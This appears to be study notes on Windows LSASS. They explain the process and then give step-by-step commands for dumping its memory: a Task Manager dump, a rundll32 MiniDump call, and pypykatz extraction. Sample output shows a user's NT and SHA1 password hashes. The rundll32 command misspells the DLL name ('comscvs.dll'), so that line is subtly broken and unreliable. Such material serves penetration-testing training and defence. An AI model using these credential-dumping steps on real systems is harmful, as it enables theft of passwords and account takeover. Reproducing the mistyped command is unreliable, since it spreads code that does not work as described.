# What is LSASS
LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.

Upon initial login, lsass will: 
- cache creds locally in memory 
- create access tokens 
- enforce policies
- writes to window's security log
## Dumping LSASS process memory
Generating a memory dump of cached LSASS data
1. **Task manager method** 
	- Open task manager 
	- select the process tab
	- Right click LSA process
	- Create dump file
	- A file called `lsass.DMP` is created and saved in `%temp%`
2. **Rundll32.exe and Comsvcs.dll method**
	- Determine what `PID` is assigned to `lsass.exe` 
	cmd:
	```cmd 
	tasklist /svc
	```
	powershell:
	```powershell
	Get-Process lsass
	```
	- Create a dump file 
	```powershell
	rundll32 C:\windows\system32\comscvs.dll, MiniDump 672 C:\lsass.dmp full
	```
	With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing
## Extracting credentials(pypykatz)
```bash
pypykatz lsa minidump /path/to/dump
```
important  info 
- MSV
 an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory
 ```shellsession
 sid S-1-5-21-4019466498-1700476312-3544718034-1001 luid 1354633 
 == MSV== 
 Username: bob Domain:
 DESKTOP-33E7O54 
 LM: NA NT: 64f12cddaa88057e06a81b54e73b949b 
 SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8 
 DPAPI: NA
 ```
 